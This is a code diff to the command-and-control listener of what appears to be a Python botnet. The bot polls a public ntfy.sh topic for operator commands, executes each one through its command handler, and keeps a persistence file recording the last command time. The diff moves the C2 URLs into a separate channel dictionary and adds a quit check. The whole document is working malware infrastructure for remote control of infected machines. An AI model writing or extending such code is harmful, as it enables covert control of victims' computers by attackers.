@@ -3,7 +3,8 @@ import bots.Parser as Parser
 from bots.Cryptographic import Cryptographic
 import json
 import os
-from datetime import date
+from datetime import datetime
+import bots.dictionaries.CommunicationChannels as CommunicationChannels
 
 # Returns commands from C2 server
 class C2Listener:
@@ -12,8 +13,8 @@ class C2Listener:
         self.parser = Parser.Parser(crypt)
         self.bot = bot
 
-        self.C2_ntfy_URL = "https://ntfy.sh/BNS_BN_22_Admin/json"
-        self.C2_ntfy_all_URL = "https://ntfy.sh/BNS_BN_22_Admin/json?poll=1"
+        # self.C2_ntfy_URL = "https://ntfy.sh/BNS_BN_22_Admin/json"
+        # self.C2_ntfy_all_URL = "https://ntfy.sh/BNS_BN_22_Admin/json?poll=1"
         self.last_command_time = 0
 
     # pull commands from C2 server
@@ -32,7 +33,7 @@ class C2Listener:
     def start_command_listener(self):
         self.__startup_check_old()
 
-        r = requests.get(url=self.C2_ntfy_URL, stream=True)
+        r = requests.get(url=CommunicationChannels.CommChannels["COMMAND_CHANNEL_DOWNLOAD"], stream=True)
 
         if r.status_code != 200:
             print(f"Bot failed to pull commands.")
@@ -51,11 +52,14 @@ class C2Listener:
                     f.write("Last time: " + str(self.last_command_time) +"\n")
                 
                 self.bot.handle_command(command)
+                
+                if self.bot.quit == True:
+                    return
 
     # check on startup if there are any past commands you missed
     def __startup_check_old(self):
         # get old messages
-        r = requests.get(url=self.C2_ntfy_all_URL, stream=True)
+        r = requests.get(url=CommunicationChannels.CommChannels["COMMAND_CHANNEL_DOWNLOAD_ALL"], stream=True)
 
         # check for error
         if r.status_code != 200:
@@ -70,9 +74,9 @@ class C2Listener:
                         self.last_command_time = int(line[11:])
         else:
             f = open("Botnet_precistantData.txt", "w")
-            f.write("Last time: 0\n")
+            f.write("Last time: " + str(datetime.now().timestamp()) + "\n")
             f.close()
-            self.last_command_time = 0
+            self.last_command_time = datetime.now().timestamp()
 
         
         # check each command
